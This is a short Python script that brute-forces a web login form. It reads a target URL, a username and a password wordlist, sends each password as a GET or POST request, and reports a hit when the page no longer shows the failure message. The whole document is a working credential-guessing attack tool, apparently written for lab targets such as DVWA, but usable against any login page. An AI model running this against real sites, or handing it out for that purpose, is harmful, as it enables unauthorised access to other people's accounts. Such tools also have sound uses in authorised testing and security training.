import requests


url = input("[+] Enter page url: ")
username = input("[+] Enter Username for the account to Bruteforce: ")
password_file = input("[+] Enter Password file to use: ")
login_failed_message = input("Enter message that displayed when login fails: ")
cookie_value = input("Enter Cookie value (Optional): ")


def cracking(username, url):
    for password in passwords:
        password = password.strip()
        print("Trying: " , password)
        data = {"username":username, "password": password, "Login": "submit"}
        if cookie_value != "":
            response = requests.get(url, params = {"username":username, "password": password, "Login": "Login"}, cookies = {"Cookie": cookie_value})
        else:
            response = requests.post(url, data = data)
        if login_failed_message in response.content.decode():
            pass
        else:
            print("[+] Found Username: ==>" , username)
            print("[+] Found Password: ==>" , password)
            exit()




with open(password_file, 'r') as passwords:
    cracking(username, url)

print("[!!!] Password NOT in List")



